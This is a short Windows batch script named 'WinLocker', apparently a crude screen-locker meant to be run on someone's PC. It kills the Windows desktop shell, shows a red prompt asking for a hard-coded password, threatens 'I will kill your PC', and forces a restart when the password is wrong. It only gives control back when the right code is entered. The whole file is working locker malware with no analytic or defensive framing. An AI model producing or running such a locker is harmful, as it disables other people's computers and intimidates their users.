@echo off
Taskkill/f /im explorer.exe
color 4
:main menu
title WinLocker
echo Hello. It's just WINLOCKER.
pause
Taskkill/f /im explorer.exe
Title WinLocker
color 12

echo Enter password.

:loop
set/p x=
if %x%==1024 (
echo Okay, it's correct password...
echo win start
start explorer
exit
) else (
echo Incorrect password!
echo I will kill your PC.
shutdown /r
)
goto loop